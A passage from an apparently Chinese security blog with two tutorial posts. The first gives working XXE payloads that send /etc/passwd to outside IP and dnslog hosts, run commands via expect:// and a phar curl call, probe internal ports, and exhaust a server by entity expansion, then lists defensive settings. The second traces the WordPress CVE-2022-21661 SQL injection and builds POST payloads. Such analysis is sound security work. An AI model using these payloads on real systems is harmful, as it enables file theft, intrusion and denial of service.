<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://148.70.205.134:8080/%file;&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>​    采用嵌套的方式也是不允许的，因为在实体定义中不允许使用参数实体。（和上面的原理相同）</p>
<p>​    因此在这种情况下，我们可以考虑利用远程加载的方式，来构造实体，从而将数据外带。我们在自己的服务器上创建一个<code>evil.dtd</code>文件，文件内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://rpiyhq.dnslog.cn/?%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后我在存在<code>XXE</code>漏洞的地方构造如下<code>Payload</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">	&lt;!ENTITY % remote SYSTEM &quot;http://101.37.118.41/test.dtd&quot;&gt;</span><br><span class="line">	%remote;</span><br><span class="line">	%all;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;send;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>​    然后就可以收到发送出去的请求数据，这样也就将读取的文件外带出去了。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220103322811.png" alt="image-20211220103322811"></p>
<h3 id="2、内网端口探测"><a href="#2、内网端口探测" class="headerlink" title="2、内网端口探测"></a>2、内网端口探测</h3><p>​    由于<code>XML</code>支持<code>http</code>协议，可以利用此方式去探测内网开启的端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>​    根据页面的返回时间，就可以判断哪些端口开放了，哪些端口关闭了。</p>
<h3 id="3、远程命令执行"><a href="#3、远程命令执行" class="headerlink" title="3、远程命令执行"></a>3、远程命令执行</h3><p>​    在某些特殊情况下，利用<code>XXE</code>漏洞，也可以进行远程命令执行。比如我们需要开启<code> PHP expect</code>模块，通过加载该模块来进行<code>RCE</code>，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;expect://whoami&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;file;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220105105341.png" alt="image-20211220105105341"></p>
<h3 id="4、反序列化漏洞利用"><a href="#4、反序列化漏洞利用" class="headerlink" title="4、反序列化漏洞利用"></a>4、反序列化漏洞利用</h3><p>​    由于在<code>php</code>环境下，<code>XML</code>支持了<code>phar</code>协议，那么有没有可能存在反序列化漏洞呢？我在本地做了一个尝试，构造一个类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class target&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system(&#x27;curl http://148.70.205.134:8080/phar&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    然后我们利用如下代码生成一个<code>phar</code>文件，将其上传至目标服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class target&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo 123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$o = new target();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    然后在存在<code>XXE</code>漏洞的地方利用<code>phar</code>协议，去包含这个文件。可以发现最后执行了<code>system</code>命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">	&lt;!ENTITY file SYSTEM &quot;phar:///app/phar.phar&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;m1sn0w&lt;/name&gt;</span><br><span class="line">&lt;tel&gt;18888888888&lt;/tel&gt;</span><br><span class="line">&lt;email&gt;&amp;file;&lt;/email&gt;</span><br><span class="line">&lt;password&gt;qwe123&lt;/password&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211220111834742.png" alt="image-20211220111834742"></p>
<h3 id="5、发起SSRF攻击"><a href="#5、发起SSRF攻击" class="headerlink" title="5、发起SSRF攻击"></a>5、发起<code>SSRF</code>攻击</h3><p>​        该攻击的利用方式和内网端口探测的方式一样，只不过可以让服务器去发送<code>payload</code>请求。对于一些只需要<code>GET</code>方法就可以触发的漏洞，我们可以利用<code>XXE</code>发起<code>SSRF</code>攻击从而完成漏洞利用。</p>
<h3 id="6、DDOS攻击"><a href="#6、DDOS攻击" class="headerlink" title="6、DDOS攻击"></a>6、<code>DDOS</code>攻击</h3><p>​    前面在介绍无回显读取本地敏感文件的时候，有提到过，实体的定义中不能使用参数实体，但是我们可以包含这样的实体<code>$nane;</code>，因此可以利用这样的方式去构造一个<code>payload</code>，不断的消耗服务器的资源：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data [</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</span><br><span class="line"></span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>​    这样不断地迭代，最后的数据量会特别大，从而导致了目标服务器的资源被耗尽，也就到了<code>DDOS</code>攻击的目的。</p>
<h2 id="三、XXE漏洞防御"><a href="#三、XXE漏洞防御" class="headerlink" title="三、XXE漏洞防御"></a>三、<code>XXE</code>漏洞防御</h2><ol>
<li>从开发语言的角度来进行配置，禁用外部实体的引入：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"> </span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"> </span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>对用户提交的数据进行一个简单的过滤，例如<code>ENTITY</code>字段等。</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl8h2gj940006fgdp5g9b8jhm" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-WordPress SQL注入漏洞（CVE-2022-21661分析与复现）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/" class="article-date">
  <time datetime="2022-06-04T14:23:06.000Z" itemprop="datePublished">2022-06-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="WordPress-SQL注入漏洞（CVE-2022-21661分析与复现）"><a href="#WordPress-SQL注入漏洞（CVE-2022-21661分析与复现）" class="headerlink" title="WordPress SQL注入漏洞（CVE-2022-21661分析与复现）"></a><code>WordPress SQL</code>注入漏洞（<code>CVE-2022-21661</code>分析与复现）</h1><h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><p>​    <code>WordPress</code>是一个用<code>PHP</code>编写的免费开源内容管理系统，由于<code>clean_query</code>函数的校验不当，导致了可能通过插件或主题以某种方式从而触发<code>SQL</code>注入的情况。这已经在<code>WordPress5.8.3</code>中进行了修复。影响版本可以追溯到<code>3.7.37</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WordPress is a free and open-source content management system written in PHP and paired with a MariaDB database. Due to improper sanitization in WP_Query, there can be cases where SQL injection is possible through plugins or themes that use it in a certain way. This has been patched in WordPress version 5.8.3. Older affected versions are also fixed via security release, that go back till 3.7.37. We strongly recommend that you keep auto-updates enabled. There are no known workarounds for this vulnerability. </span><br></pre></td></tr></table></figure>

<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><p>​    在分析整个漏洞之前，首先可以看一下如果想要触发该漏洞，漏洞代码应该是什么样子的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new WP_Query($_POST[&#x27;query_vars&#x27;])</span><br></pre></td></tr></table></figure>

<p>​    这也就是说，传入<code>WP_Query</code>的参数如果可控的话，就可以利用该漏洞。接下来我们看看整个漏洞的利用调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WP_Query::__construct</span><br><span class="line">	WP_Query::query</span><br><span class="line">		WP_Query::get_posts</span><br><span class="line">			WP_Tax_Query::get_sql</span><br><span class="line">				WP_Tax_Query::get_sql_clauses</span><br><span class="line">					WP_Tax_Query::get_sql_for_query</span><br><span class="line">						WP_Tax_Query::get_sql_for_clause</span><br><span class="line">							WP_Tax_Query::clean_query</span><br></pre></td></tr></table></figure>

<p>​    根据官方的修复代码，最后的漏洞点位于<code>WP_Tax_Query</code>的<code>clean_query</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114152416687.png" alt="image-20220114152416687"></p>
<p>​    根据漏洞的描述，我们知道的是<code>WP_Tax_Query::clean_query</code>函数对变量没有做严格的校验，最终导致了<code>SQL</code>语句的拼接，进而导致了<code>SQL</code>注入漏洞。</p>
<p>​    通过上下文的分析，我们将注意放置在<code>WP_Tax_Query::get_sql_for_clause</code>这个函数上面，这也是整个漏洞利用调用链中的一个函数；在这个函数中，使用到了<code>clean_query</code>方法对传入的参数进行了校验过滤处理：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119150910580.png" alt="image-20220119150910580"></p>
<p>​    继续查看该方法下面的代码，我们可以知道<code>items</code>变量最终拼接到了<code>SQL</code>语句中。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119151106683.png" alt="image-20220119151106683"></p>
<p>​    该漏洞最终需要利用的就是这个<code>items</code>变量，如果能够控制这个变量的值的话，就可以导致注入。</p>
<p>​    知道了漏洞点的位置，现在我们正向去分析一下。首先我们知道漏洞代码是这个样子的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new WP_Query($_POST[&#x27;query_vars&#x27;])</span><br></pre></td></tr></table></figure>

<p>​    跟进到<code>WP_Query</code>对象的构造方法，知道其调用了<code>query</code>方法。在<code>WP_Query::query</code>中，调用了<code>wp_parse_args</code>函数对输入的字符串进行了处理：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function wp_parse_args( $args, $defaults = array() ) &#123;</span><br><span class="line">	if ( is_object( $args ) ) &#123;</span><br><span class="line">		$parsed_args = get_object_vars( $args );</span><br><span class="line">	&#125; elseif ( is_array( $args ) ) &#123;</span><br><span class="line">		$parsed_args =&amp; $args;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		wp_parse_str( $args, $parsed_args );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ( is_array( $defaults ) &amp;&amp; $defaults ) &#123;</span><br><span class="line">		return array_merge( $defaults, $parsed_args );</span><br><span class="line">	&#125;</span><br><span class="line">	return $parsed_args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这里主要关注前面两个点，一个是如果传入的是一个对象的话，将其属性名和值取出来转变成数组；如果直接传入的是数组的话，也就是直接返回了。这里也就确定<code>$this-&gt;query_vars</code>和<code>$this-&gt;query</code>变量可控了。</p>
<p>​    接下来调用<code>get_posts</code>方法，该方法的代码比较长，我们直接定位到利用链函数：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114160043348.png" alt="image-20220114160043348"></p>
<p>​    变量<code>$this-&gt;is_singular</code>初始化之后为<code>false</code>，所以这里的<code>if</code>语句是会执行的，而下面的<code>$this-&gt;parse_tax_query($q)</code>语句，跟进去，其实就是给变量<code>$this-&gt;tax_query</code>赋值，其值为<code>WP_Tax_Query</code>类对应的对象，同时利用传入的<code>$q</code>变量，对该对象进行了一些初始化。这里关键就是<code>$q</code>变量，我们向上追溯，查看一下该变量的生成过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$q = &amp;$this-&gt;query_vars;</span><br><span class="line"></span><br><span class="line">$q = $this-&gt;fill_query_vars( $q );</span><br></pre></td></tr></table></figure>

<p>​    首先<code>$q</code>变量获取<code>$this-&gt;query_vars</code>，通过上面的分析，我们知道这个变量是可控的，也就是我们通过<code>POST</code>传入的参数值。接下来调用<code>fill_query_vars</code>方法，跟进去会发现这个函数就是向<code>$q</code>这个数组里面添加了一些<code>key</code>值。我们可以传入一个数组，然后<code>var_dump</code>出来看看：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114161050220.png" alt="image-20220114161050220"></p>
<p>​    接下来进入<code>$this-&gt;parse_tax_query($q)</code>这个函数看看。该函数就是通过传入的<code>$q</code>数组，然后赋值给<code>$tax_query</code>变量，然后利用该变量去初始化对象<code>$this-&gt;tax_query = new WP_Tax_Query( $tax_query );</code>，在<code>parse_tax_query</code>函数中，我们需要给<code>$tax_query</code>变量赋值，就需要传入的数组中带有<code>tax_query</code>这个关键词即可。我们跟进到这个类的构造函数去看看：（简单说明就是经过处理的<code>$q</code>变量的值作为了<code>WP_Tax_Query</code>对象的构造函数的参数值）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114162159550.png" alt="image-20220114162159550"></p>
<p>​    可以看到<code>$this-&gt;queries</code>变量的值是由<code>$tax_query</code>赋值得到的，只不过这里做了一些过滤，即调用了<code>sanitize_query</code>函数进行了处理。</p>
<p>​    到这里，我们就进入到了<code>WP_Tax_Query</code>类，并且我们可以控制传入这个类的构造函数的参数值。接下来看看这个构造函数中对传入的参数值做了哪些处理，也就是这个<code>sanitize_query</code>函数：（这里只截取关键部分了）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">elseif ( self::is_first_order_clause( $query ) ) &#123;</span><br><span class="line">				$cleaned_clause          = array_merge( $defaults, $query );</span><br><span class="line">				$cleaned_clause[&#x27;terms&#x27;] = (array) $cleaned_clause[&#x27;terms&#x27;];</span><br><span class="line">				$cleaned_query[]         = $cleaned_clause;</span><br><span class="line">				if ( ! empty( $cleaned_clause[&#x27;taxonomy&#x27;] ) &amp;&amp; &#x27;NOT IN&#x27; !== $cleaned_clause[&#x27;operator&#x27;] ) &#123;</span><br><span class="line">					$taxonomy = $cleaned_clause[&#x27;taxonomy&#x27;];</span><br><span class="line">					if ( ! isset( $this-&gt;queried_terms[ $taxonomy ] ) ) &#123;</span><br><span class="line">						$this-&gt;queried_terms[ $taxonomy ] = array();</span><br><span class="line">					&#125;</span><br><span class="line">					if ( ! empty( $cleaned_clause[&#x27;terms&#x27;] ) &amp;&amp; ! isset( $this-&gt;queried_terms[ $taxonomy ][&#x27;terms&#x27;] ) ) &#123;</span><br><span class="line">						$this-&gt;queried_terms[ $taxonomy ][&#x27;terms&#x27;] = $cleaned_clause[&#x27;terms&#x27;];</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					if ( ! empty( $cleaned_clause[&#x27;field&#x27;] ) &amp;&amp; ! isset( $this-&gt;queried_terms[ $taxonomy ][&#x27;field&#x27;] ) ) &#123;</span><br><span class="line">						$this-&gt;queried_terms[ $taxonomy ][&#x27;field&#x27;] = $cleaned_clause[&#x27;field&#x27;];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们要进入到这个<code>if</code>语句，就需要通过<code>is_first_order_clause</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected static function is_first_order_clause( $query ) &#123;</span><br><span class="line">	return is_array( $query ) &amp;&amp; ( empty( $query ) || array_key_exists( &#x27;terms&#x27;, $query ) || array_key_exists( &#x27;taxonomy&#x27;, $query ) || array_key_exists( &#x27;include_children&#x27;, $query ) || array_key_exists( &#x27;field&#x27;, $query ) || array_key_exists( &#x27;operator&#x27;, $query ) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这个函数比较简单，就是需要传入的数据通过<code>foreach</code>迭代之后，仍然是一个数组，也就是传入的需要是一个二维数组，并且需要携带一些<code>key</code>值。（加上前面的需要传入<code>tax_query</code>关键词，到这里就需要传入的是一个三维数组）</p>
<p>​    由于我们要控制<code>terms</code>的值，所以传入的<code>terms</code>也要是一个数组，也就是说如果要控制<code>terms</code>值，需要传入一个四维数组，例如如下<code>POST</code>数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=AND</span><br></pre></td></tr></table></figure>

<p>​    我们在这里先分析一下这个<code>POST</code>的数据。首先需要一个<code>tax_query</code>，是为了能给<code>$tax_query</code>变量赋值，然后我这里加了一个<code>1</code>是为了构造多维数组，这样传入进去之后，到上面这个<code>foreach</code>取出来之后，就是一个数组，从而构造了<code>$this-&gt;queries</code>，并且由于我们需要控制<code>terms</code>值，<code>$cleaned_clause[&#39;terms&#39;] = (array) $cleaned_clause[&#39;terms&#39;];</code>表名我们需要传入一个数组来进行<code>merge</code>函数的拼接从而覆盖。传入以上数据之后，<code>$this-&gt;queries</code>的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [1] =&gt; Array</span><br><span class="line">        (</span><br><span class="line">            [include_children] =&gt; 1</span><br><span class="line">            [terms] =&gt; Array</span><br><span class="line">                (</span><br><span class="line">                    [1] =&gt; AND</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>​    以上分析都是在初始化<code>WP_Tax_Query</code>这个对象。接下来继续向下分析，开始调用<code>WP_Tax_Query::get_sql</code>方法，然后调用了<code>WP_Tax_Query::get_sql_clauses</code>方法：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114162544292.png" alt="image-20220114162544292"></p>
<p>​    之后将<code>$this-&gt;queries</code>变量的值传入<code>get_sql_for_query</code>函数，我们继续跟进一下这个函数：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220114163150988.png" alt="image-20220114163150988"></p>
<p>​    如果我们想要调用<code>get_sql_for_clause</code>方法的话，就需要对传入的数据进行一个控制，这里的关键在于<code>is_array($clause)</code>语句，也就是说，我们通过构造以后，这里需要传入一个二维数组，进而能够执行到这个条件里面并且需要满足<code>is_first_order_clause</code>函数，因此我们按照上面的构造方式是可以执行到这里的，并且这里的<code>$clause</code>的值为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">array(5) &#123;</span><br><span class="line">  [&quot;taxonomy&quot;]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [&quot;terms&quot;]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [1]=&gt;</span><br><span class="line">    string(3) &quot;AND&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;field&quot;]=&gt;</span><br><span class="line">  string(7) &quot;term_id&quot;</span><br><span class="line">  [&quot;operator&quot;]=&gt;</span><br><span class="line">  string(2) &quot;IN&quot;</span><br><span class="line">  [&quot;include_children&quot;]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    接下来就进入了<code>get_sql_for_clause</code>函数，也就是我们最终拼接<code>SQL</code>语句的地方，但在拼接之前，我们需要绕过<code>clean_query</code>函数，我们跟进这个函数看看：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119161246170.png" alt="image-20220119161246170"></p>
<p>​    这里为了不让他异常退出，我们需要添加一个<code>field</code>字段，让其值等于<code>term_taxonomy_id</code>即可，构造语句为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=AND&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

<p>​    并且在函数的最后，调用了<code>$this-&gt;transform_query( $query, &#39;term_taxonomy_id&#39; );</code>，我们跟进去，正好判定<code>field</code>的值，从而<code>return</code>，跳过了后面的执行操作：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162028818.png" alt="image-20220119162028818"></p>
<p>​        接下来就是<code>SQL</code>语句的拼接了，根据我们构造的<code>operator</code>的不同值，没有构造的话就是<code>IN</code>了，进行不同的拼接操作，这里是<code>IN</code>，我们进入到这个<code>if</code>语句：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20220119162417374.png" alt="image-20220119162417374"></p>
<p>​    我们在<code>terms</code>处构造报错注入代码即可：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=aa&amp;query_vars[tax_query][1][include_children]=1&amp;query_vars[tax_query][1][terms][1]=AND&amp;query_vars[tax_query][1][field]=term_taxonomy_id</span><br></pre></td></tr></table></figure>

